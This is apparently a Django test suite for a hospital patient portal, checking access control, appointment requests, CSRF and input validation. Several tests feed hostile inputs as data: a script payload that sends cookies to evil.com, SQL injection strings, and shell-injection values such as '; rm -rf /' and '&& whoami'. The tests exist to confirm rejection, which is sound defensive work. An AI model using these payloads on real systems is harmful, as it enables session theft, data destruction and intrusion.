from cryptography.fernet import Fernet
from django.test import Client, TestCase, override_settings
from django.urls import reverse
from django.utils import timezone

from auth_app.models import Staff, UserAccount
from billing_app.models import Invoice
from medical_app.models import Appointment, Encounter, MedicalRecordEntry, Patient


TEST_FERNET_KEY = Fernet.generate_key().decode()


@override_settings(FIELD_ENCRYPTION_KEY=TEST_FERNET_KEY)
class PatientPortalTests(TestCase):
	def setUp(self):
		self.doctor_user = UserAccount.objects.create_user(
			username="doctor2",
			password="StrongPassword123!",
			mfaEnabled=True,
		)
		self.doctor_staff = Staff.objects.create(
			user=self.doctor_user,
			name="Doctor Two",
			role="DOCTOR",
		)

		self.patient_user = UserAccount.objects.create_user(
			username="patient1",
			password="StrongPassword123!",
			is_patient=True,
			mfaEnabled=False,
		)
		self.patient = Patient.objects.create(
			user=self.patient_user,
			mrn="MRN-PORTAL-01",
			name="Patient One",
			dateOfBirth="1999-01-01",
			address="Jl. Mawar 10",
			phoneNumber="08123456789",
		)

		self.other_user = UserAccount.objects.create_user(
			username="patient2",
			password="StrongPassword123!",
			is_patient=True,
			mfaEnabled=False,
		)
		self.other_patient = Patient.objects.create(
			user=self.other_user,
			mrn="MRN-PORTAL-02",
			name="Patient Two",
			dateOfBirth="1998-01-01",
			address="Jl. Melati 22",
			phoneNumber="08123456780",
		)

		self.encounter = Encounter.objects.create(
			patient=self.patient,
			staff=self.doctor_staff,
			complaint="Pusing",
		)
		record = MedicalRecordEntry(encounter=self.encounter)
		record.encrypt_data(
			raw_diagnosis="Vertigo",
			raw_treatment="Istirahat",
			raw_notes="Catatan dokter internal",
		)
		record.save()

		self.other_encounter = Encounter.objects.create(
			patient=self.other_patient,
			staff=self.doctor_staff,
			complaint="Demam",
		)

		self.invoice = Invoice.objects.create(
			encounter=self.encounter,
			totalAmount="200000.00",
			status=Invoice.InvoiceStatus.UNPAID,
		)

	def test_self_registration_rejects_script_payload(self):
		response = self.client.post(
			reverse("core_app:patient_register"),
			{
				"username": "newpatient",
				"email": "new@example.com",
				"password": "StrongPassword123!",
				"confirm_password": "StrongPassword123!",
				"full_name": "<script>alert(1)</script>",
				"date_of_birth": "2000-01-01",
				"address": "Jl. Aman 1",
				"phone_number": "08123456789",
			},
		)

		self.assertEqual(response.status_code, 200)
		self.assertContains(response, "Nama hanya boleh")
		self.assertFalse(UserAccount.objects.filter(username="newpatient").exists())

	def test_self_registration_rejects_script_payload_in_all_text_fields(self):
		payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"

		response = self.client.post(
			reverse("core_app:patient_register"),
			{
				"username": payload,
				"email": "new@example.com",
				"password": payload,
				"confirm_password": payload,
				"full_name": payload,
				"date_of_birth": "2000-01-01",
				"address": payload,
				"phone_number": payload,
			},
		)

		self.assertEqual(response.status_code, 200)
		self.assertContains(response, "Username hanya boleh")
		self.assertContains(response, "Password mengandung karakter")
		self.assertContains(response, "Konfirmasi password mengandung karakter")
		self.assertContains(response, "Nama hanya boleh")
		self.assertContains(response, "Alamat mengandung karakter")
		self.assertContains(response, "No. telepon hanya boleh")
		self.assertFalse(UserAccount.objects.filter(email="new@example.com").exists())

	def test_patient_cannot_access_other_patient_encounter(self):
		self.client.login(username="patient1", password="StrongPassword123!")

		response = self.client.get(
			reverse("core_app:patient_encounter_detail", args=[self.other_encounter.pk])
		)

		self.assertEqual(response.status_code, 404)

	def test_staff_forbidden_from_patient_portal(self):
		self.client.login(username="doctor2", password="StrongPassword123!")

		response = self.client.get(reverse("core_app:patient_dashboard"))

		self.assertRedirects(response, reverse("landing_page"))

	def test_authenticated_user_cannot_open_registration_page(self):
		self.client.force_login(self.patient_user)

		response = self.client.get(reverse("core_app:patient_register"), follow=True)

		self.assertRedirects(response, reverse("landing_page"))
		self.assertContains(response, "Anda sudah login")

	def test_patient_can_request_appointment(self):
		self.client.login(username="patient1", password="StrongPassword123!")

		response = self.client.post(
			reverse("core_app:patient_request_appointment"),
			{
				"doctor": str(self.doctor_staff.id),
				"scheduledAt": (timezone.now() + timezone.timedelta(days=2)).strftime("%Y-%m-%dT%H:%M"),
				"reason": "Kontrol rutin",
			},
		)

		self.assertEqual(response.status_code, 302)
		self.assertTrue(Appointment.objects.filter(patient=self.patient, status="PENDING").exists())

	def test_patient_request_appointment_requires_doctor(self):
		self.client.login(username="patient1", password="StrongPassword123!")

		response = self.client.post(
			reverse("core_app:patient_request_appointment"),
			{
				"scheduledAt": (timezone.now() + timezone.timedelta(days=2)).strftime("%Y-%m-%dT%H:%M"),
				"reason": "Kontrol rutin",
			},
		)

		self.assertEqual(response.status_code, 200)
		self.assertContains(response, "Dokter wajib dipilih.")
		self.assertFalse(Appointment.objects.filter(patient=self.patient, status="PENDING").exists())

	def test_patient_request_appointment_requires_date(self):
		self.client.login(username="patient1", password="StrongPassword123!")

		response = self.client.post(
			reverse("core_app:patient_request_appointment"),
			{
				"doctor": str(self.doctor_staff.id),
				"reason": "Kontrol rutin",
			},
		)

		self.assertEqual(response.status_code, 200)
		self.assertContains(response, "Tanggal dan waktu janji temu wajib diisi.")
		self.assertFalse(Appointment.objects.filter(patient=self.patient, status="PENDING").exists())

	def test_patient_request_appointment_rejects_script_payload_reason(self):
		self.client.login(username="patient1", password="StrongPassword123!")
		payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"

		response = self.client.post(
			reverse("core_app:patient_request_appointment"),
			{
				"doctor": str(self.doctor_staff.id),
				"scheduledAt": (timezone.now() + timezone.timedelta(days=2)).strftime("%Y-%m-%dT%H:%M"),
				"reason": payload,
			},
		)

		self.assertEqual(response.status_code, 200)
		self.assertContains(response, "Keluhan hanya boleh")
		self.assertFalse(Appointment.objects.filter(patient=self.patient, reason=payload).exists())

	def test_patient_can_edit_own_profile(self):
		self.client.login(username="patient1", password="StrongPassword123!")

		response = self.client.post(
			reverse("core_app:patient_edit", args=[self.patient.id]),
			{
				"name": "Patient One Updated",
				"dateOfBirth": "1999-01-01",
				"address": "Jl. Aman #12",
				"phoneNumber": "+62 812-3456-7890",
			},
		)

		self.assertRedirects(response, reverse("core_app:patient_dashboard"))
		self.patient.refresh_from_db()
		self.assertEqual(self.patient.name, "Patient One Updated")
		self.assertEqual(self.patient.address, "Jl. Aman #12")
		self.assertEqual(self.patient.phoneNumber, "+62 812-3456-7890")

	def test_patient_cannot_edit_other_patient_profile(self):
		self.client.login(username="patient1", password="StrongPassword123!")

		response = self.client.post(
			reverse("core_app:patient_edit", args=[self.other_patient.id]),
			{
				"name": "Changed Other Patient",
				"dateOfBirth": "1998-01-01",
				"address": "Jl. Tidak Boleh 1",
				"phoneNumber": "08123456780",
			},
		)

		self.assertRedirects(response, reverse("core_app:patient_dashboard"))
		self.other_patient.refresh_from_db()
		self.assertEqual(self.other_patient.name, "Patient Two")

	def test_patient_profile_edit_rejects_injection_payloads(self):
		self.client.login(username="patient1", password="StrongPassword123!")

		response = self.client.post(
			reverse("core_app:patient_edit", args=[self.patient.id]),
			{
				"name": "12345' OR '1'='1",
				"dateOfBirth": "1999-01-01",
				"address": "Jl. Aman 1; rm -rf /",
				"phoneNumber": "08123456789 && whoami",
			},
		)

		self.assertEqual(response.status_code, 200)
		self.assertContains(response, "Nama hanya boleh")
		self.assertContains(response, "Alamat mengandung karakter")
		self.assertContains(response, "No. telepon hanya boleh")
		self.patient.refresh_from_db()
		self.assertEqual(self.patient.name, "Patient One")

	def test_patient_profile_edit_rejects_script_payload_fields(self):
		self.client.login(username="patient1", password="StrongPassword123!")
		payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"

		response = self.client.post(
			reverse("core_app:patient_edit", args=[self.patient.id]),
			{
				"name": payload,
				"dateOfBirth": "1999-01-01",
				"address": payload,
				"phoneNumber": payload,
			},
		)

		self.assertEqual(response.status_code, 200)
		self.assertContains(response, "Nama hanya boleh")
		self.assertContains(response, "Alamat mengandung karakter")
		self.assertContains(response, "No. telepon hanya boleh")
		self.patient.refresh_from_db()
		self.assertEqual(self.patient.name, "Patient One")

	def test_patient_profile_edit_requires_csrf_token(self):
		csrf_client = Client(enforce_csrf_checks=True)
		csrf_client.login(username="patient1", password="StrongPassword123!")

		response = csrf_client.post(
			reverse("core_app:patient_edit", args=[self.patient.id]),
			{
				"name": "Patient One Updated",
				"dateOfBirth": "1999-01-01",
				"address": "Jl. Aman #12",
				"phoneNumber": "08123456789",
			},
		)

		self.assertEqual(response.status_code, 403)
		self.assertTemplateUsed(response, "auth_app/forbidden.html")
		self.assertContains(response, "Forbidden Request", status_code=403)

	def test_auth_profile_shows_patient_edit_profile_link(self):
		self.client.login(username="patient1", password="StrongPassword123!")

		response = self.client.get(reverse("auth_app:profile"))

		self.assertEqual(response.status_code, 200)
		self.assertContains(response, reverse("core_app:patient_edit", args=[self.patient.id]))

	def test_patient_login_redirects_to_patient_dashboard(self):
		response = self.client.post(reverse("auth_app:login"), {
			"username": "patient1",
			"password": "StrongPassword123!",
		})

		self.assertRedirects(response, reverse("core_app:patient_dashboard"))

	def test_encounter_search_accepts_text_input(self):
		self.client.login(username="patient1", password="StrongPassword123!")

		response = self.client.get(
			reverse("core_app:patient_encounters"),
			{"q": str(self.encounter.encounterNumber)},
		)

		self.assertEqual(response.status_code, 200)
		self.assertContains(response, f"Encounter #{self.encounter.encounterNumber}")

	def test_encounter_search_rejects_sql_injection_payload(self):
		self.client.login(username="patient1", password="StrongPassword123!")

		response = self.client.get(
			reverse("core_app:patient_encounters"),
			{"q": "12345' OR '1'='1"},
		)

		self.assertEqual(response.status_code, 200)
		self.assertContains(response, "No encounter history found.")
		self.assertNotContains(response, f"Encounter #{self.encounter.encounterNumber}")
